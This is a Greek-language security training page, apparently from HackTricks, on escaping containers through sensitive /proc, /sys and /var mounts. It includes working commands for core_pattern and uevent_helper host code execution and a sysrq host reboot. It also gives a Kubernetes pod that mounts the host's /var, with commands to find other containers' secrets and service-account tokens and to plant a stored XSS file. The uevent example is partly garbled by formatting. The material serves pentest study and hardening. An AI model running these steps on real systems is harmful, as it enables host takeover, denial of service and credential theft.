# Ευαίσθητοι Σημειακοί Σύνδεσμοι

{{#include ../../../../banners/hacktricks-training.md}}

Η έκθεση των `/proc`, `/sys` και `/var` χωρίς κατάλληλη απομόνωση ονομάτων εισάγει σημαντικούς κινδύνους ασφαλείας, συμπεριλαμβανομένης της αύξησης της επιφάνειας επίθεσης και της αποκάλυψης πληροφοριών. Αυτοί οι κατάλογοι περιέχουν ευαίσθητα αρχεία που, αν είναι κακώς ρυθμισμένα ή προσπελαστούν από μη εξουσιοδοτημένο χρήστη, μπορούν να οδηγήσουν σε διαφυγή κοντέινερ, τροποποίηση του κεντρικού υπολογιστή ή να παρέχουν πληροφορίες που βοηθούν σε περαιτέρω επιθέσεις. Για παράδειγμα, η λανθασμένη τοποθέτηση `-v /proc:/host/proc` μπορεί να παρακάμψει την προστασία του AppArmor λόγω της βασισμένης σε διαδρομή φύσης της, αφήνοντας το `/host/proc` απροστάτευτο.

**Μπορείτε να βρείτε περισσότερες λεπτομέρειες για κάθε πιθανή ευπάθεια στο** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Ευπάθειες procfs

### `/proc/sys`

Αυτός ο κατάλογος επιτρέπει την πρόσβαση για την τροποποίηση μεταβλητών του πυρήνα, συνήθως μέσω `sysctl(2)`, και περιέχει αρκετούς υποκαταλόγους που προκαλούν ανησυχία:

#### **`/proc/sys/kernel/core_pattern`**

- Περιγράφεται στο [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Αν μπορείτε να γράψετε μέσα σε αυτό το αρχείο, είναι δυνατόν να γράψετε έναν σωλήνα `|` ακολουθούμενο από τη διαδρομή προς ένα πρόγραμμα ή σενάριο που θα εκτελείται μετά από μια αποτυχία.
- Ένας επιτιθέμενος μπορεί να βρει τη διαδρομή μέσα στον κεντρικό υπολογιστή προς το κοντέινερ του εκτελώντας `mount` και να γράψει τη διαδρομή προς ένα δυαδικό αρχείο μέσα στο σύστημα αρχείων του κοντέινερ του. Στη συνέχεια, να προκαλέσει μια αποτυχία σε ένα πρόγραμμα για να κάνει τον πυρήνα να εκτελέσει το δυαδικό αρχείο έξω από το κοντέινερ.

- **Παράδειγμα Δοκιμής και Εκμετάλλευσης**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
Ελέγξτε [αυτή την ανάρτηση](https://pwning.systems/posts/escaping-containers-for-fun/) για περισσότερες πληροφορίες.

Παράδειγμα προγράμματος που καταρρέει:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- Λεπτομέρειες στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Περιέχει τη διαδρομή προς τον φορτωτή πυρήνα, που καλείται για τη φόρτωση πυρήνων.
- **Παράδειγμα Ελέγχου Πρόσβασης**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Έλεγχος πρόσβασης στο modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Αναφέρεται στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Μια παγκόσμια σημαία που ελέγχει αν ο πυρήνας πανικοβάλλεται ή καλεί τον OOM killer όταν συμβαίνει μια κατάσταση OOM.

#### **`/proc/sys/fs`**

- Σύμφωνα με το [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), περιέχει επιλογές και πληροφορίες σχετικά με το σύστημα αρχείων.
- Η πρόσβαση εγγραφής μπορεί να επιτρέψει διάφορες επιθέσεις άρνησης υπηρεσίας κατά του host.

#### **`/proc/sys/fs/binfmt_misc`**

- Επιτρέπει την καταχώριση διερμηνέων για μη εγγενείς δυαδικές μορφές με βάση τον μαγικό τους αριθμό.
- Μπορεί να οδηγήσει σε κλιμάκωση προνομίων ή πρόσβαση σε root shell αν το `/proc/sys/fs/binfmt_misc/register` είναι εγγράψιμο.
- Σχετική εκμετάλλευση και εξήγηση:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Αναλυτικός οδηγός: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Άλλα στο `/proc`

#### **`/proc/config.gz`**

- Μπορεί να αποκαλύψει τη διαμόρφωση του πυρήνα αν είναι ενεργοποιημένο το `CONFIG_IKCONFIG_PROC`.
- Χρήσιμο για επιτιθέμενους για την αναγνώριση ευπαθειών στον τρέχοντα πυρήνα.

#### **`/proc/sysrq-trigger`**

- Επιτρέπει την εκτέλεση εντολών Sysrq, προκαλώντας πιθανώς άμεσες επανεκκινήσεις συστήματος ή άλλες κρίσιμες ενέργειες.
- **Παράδειγμα Επανεκκίνησης Host**:

```bash
echo b > /proc/sysrq-trigger # Επανεκκινεί τον host
```

#### **`/proc/kmsg`**

- Εκθέτει μηνύματα του δακτυλίου του πυρήνα.
- Μπορεί να βοηθήσει σε εκμεταλλεύσεις πυρήνα, διαρροές διευθύνσεων και να παρέχει ευαίσθητες πληροφορίες συστήματος.

#### **`/proc/kallsyms`**

- Λίστα συμβόλων που εξάγονται από τον πυρήνα και τις διευθύνσεις τους.
- Απαραίτητο για την ανάπτυξη εκμεταλλεύσεων πυρήνα, ειδικά για την υπέρβαση του KASLR.
- Οι πληροφορίες διευθύνσεων περιορίζονται με το `kptr_restrict` ρυθμισμένο σε `1` ή `2`.
- Λεπτομέρειες στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Διασυνδέεται με τη συσκευή μνήμης πυρήνα `/dev/mem`.
- Ιστορικά ευάλωτο σε επιθέσεις κλιμάκωσης προνομίων.
- Περισσότερα στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Αντιπροσωπεύει τη φυσική μνήμη του συστήματος σε μορφή ELF core.
- Η ανάγνωση μπορεί να διαρρεύσει περιεχόμενα μνήμης του host και άλλων κοντέινερ.
- Μεγάλο μέγεθος αρχείου μπορεί να οδηγήσει σε προβλήματα ανάγνωσης ή κρασάρισμα λογισμικού.
- Λεπτομερής χρήση στο [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Εναλλακτική διεπαφή για το `/dev/kmem`, που αντιπροσωπεύει τη εικονική μνήμη του πυρήνα.
- Επιτρέπει την ανάγνωση και εγγραφή, επομένως άμεση τροποποίηση της μνήμης του πυρήνα.

#### **`/proc/mem`**

- Εναλλακτική διεπαφή για το `/dev/mem`, που αντιπροσωπεύει τη φυσική μνήμη.
- Επιτρέπει την ανάγνωση και εγγραφή, η τροποποίηση όλης της μνήμης απαιτεί την επίλυση εικονικών σε φυσικές διευθύνσεις.

#### **`/proc/sched_debug`**

- Επιστρέφει πληροφορίες προγραμματισμού διεργασιών, παρακάμπτοντας τις προστασίες του PID namespace.
- Εκθέτει ονόματα διεργασιών, IDs και αναγνωριστικά cgroup.

#### **`/proc/[pid]/mountinfo`**

- Παρέχει πληροφορίες σχετικά με τα σημεία προσάρτησης στο namespace προσάρτησης της διεργασίας.
- Εκθέτει την τοποθεσία του `rootfs` ή της εικόνας του κοντέινερ.

### Ευπάθειες στο `/sys`

#### **`/sys/kernel/uevent_helper`**

- Χρησιμοποιείται για την επεξεργασία `uevents` συσκευών πυρήνα.
- Η εγγραφή στο `/sys/kernel/uevent_helper` μπορεί να εκτελέσει αυθαίρετα σενάρια κατά την ενεργοποίηση `uevent`.
- **Παράδειγμα Εκμετάλλευσης**: %%%bash

#### Δημιουργεί ένα payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Βρίσκει τη διαδρομή του host από την προσάρτηση OverlayFS για το κοντέινερ

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Ρυθμίζει το uevent_helper σε κακόβουλο βοηθό

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Ενεργοποιεί ένα uevent

echo change > /sys/class/mem/null/uevent

#### Διαβάζει την έξοδο

cat /output %%%

#### **`/sys/class/thermal`**

- Ελέγχει τις ρυθμίσεις θερμοκρασίας, προκαλώντας πιθανώς επιθέσεις DoS ή φυσική ζημιά.

#### **`/sys/kernel/vmcoreinfo`**

- Διαρρέει διευθύνσεις πυρήνα, πιθανώς υπονομεύοντας το KASLR.

#### **`/sys/kernel/security`**

- Περιέχει τη διεπαφή `securityfs`, επιτρέποντας τη διαμόρφωση των Linux Security Modules όπως το AppArmor.
- Η πρόσβαση μπορεί να επιτρέψει σε ένα κοντέινερ να απενεργοποιήσει το σύστημα MAC του.

#### **`/sys/firmware/efi/vars` και `/sys/firmware/efi/efivars`**

- Εκθέτει διεπαφές για αλληλεπίδραση με μεταβλητές EFI στο NVRAM.
- Λανθασμένη διαμόρφωση ή εκμετάλλευση μπορεί να οδηγήσει σε κατεστραμμένα laptops ή μηχανές host που δεν εκκινούν.

#### **`/sys/kernel/debug`**

- Το `debugfs` προσφέρει μια διεπαφή αποσφαλμάτωσης "χωρίς κανόνες" στον πυρήνα.
- Ιστορικό προβλημάτων ασφαλείας λόγω της απεριόριστης φύσης του.

### Ευπάθειες στο `/var`

Ο φάκελος **/var** του host περιέχει sockets χρόνου εκτέλεσης κοντέινερ και τα συστήματα αρχείων των κοντέινερ.
Αν αυτός ο φάκελος είναι προσαρτημένος μέσα σε ένα κοντέινερ, το κοντέινερ αυτό θα αποκτήσει πρόσβαση ανάγνωσης-εγγραφής στα συστήματα αρχείων άλλων κοντέινερ
με προνόμια root. Αυτό μπορεί να καταχραστεί για να μεταπηδήσει μεταξύ κοντέινερ, να προκαλέσει άρνηση υπηρεσίας ή να δημιουργήσει backdoor σε άλλα
κοντέινερ και εφαρμογές που εκτελούνται σε αυτά.

#### Kubernetes

Αν ένα κοντέινερ όπως αυτό αναπτυχθεί με Kubernetes:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Μέσα στο **pod-mounts-var-folder** κοντέινερ:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
Το XSS επιτεύχθηκε:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Σημειώστε ότι το κοντέινερ ΔΕΝ απαιτεί επανεκκίνηση ή οτιδήποτε άλλο. Οποιεσδήποτε αλλαγές γίνουν μέσω του τοποθετημένου **/var** φακέλου θα εφαρμοστούν άμεσα.

Μπορείτε επίσης να αντικαταστήσετε αρχεία ρυθμίσεων, δυαδικά αρχεία, υπηρεσίες, αρχεία εφαρμογών και προφίλ κελύφους για να επιτύχετε αυτόματη (ή ημι-αυτόματη) RCE.

##### Πρόσβαση σε διαπιστευτήρια cloud

Το κοντέινερ μπορεί να διαβάσει τα tokens serviceaccount K8s ή τα tokens webidentity AWS
που επιτρέπουν στο κοντέινερ να αποκτήσει μη εξουσιοδοτημένη πρόσβαση σε K8s ή cloud:
```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```
#### Docker

Η εκμετάλλευση στο Docker (ή σε αναπτύξεις Docker Compose) είναι ακριβώς η ίδια, εκτός από το ότι συνήθως τα συστήματα αρχείων των άλλων κοντέινερ είναι διαθέσιμα κάτω από μια διαφορετική βασική διαδρομή:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Έτσι, τα συστήματα αρχείων βρίσκονται κάτω από `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Σημείωση

Οι πραγματικοί δρόμοι μπορεί να διαφέρουν σε διαφορετικές ρυθμίσεις, γι' αυτό η καλύτερη επιλογή σας είναι να χρησιμοποιήσετε την εντολή **find** για να εντοπίσετε τα συστήματα αρχείων των άλλων κοντέινερ και τα SA / web identity tokens.

### Αναφορές

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
